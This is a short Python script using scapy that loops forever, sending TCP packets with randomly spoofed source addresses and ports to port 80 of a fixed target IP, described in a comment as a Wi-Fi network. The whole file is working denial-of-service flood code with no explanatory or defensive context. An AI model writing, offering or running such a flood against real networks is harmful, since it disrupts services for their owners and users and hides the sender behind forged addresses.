from scapy.all import *
import random

target = "192.168.1.1" # IP address of target Wi-Fi network
port = 80 # port to target

while True:
    src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4)) # generate random source IP
    src_port = random.randint(1024, 65535) # generate random source port
    dst_ip = target
    dst_port = port

    packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port)
    send(packet, verbose=0)
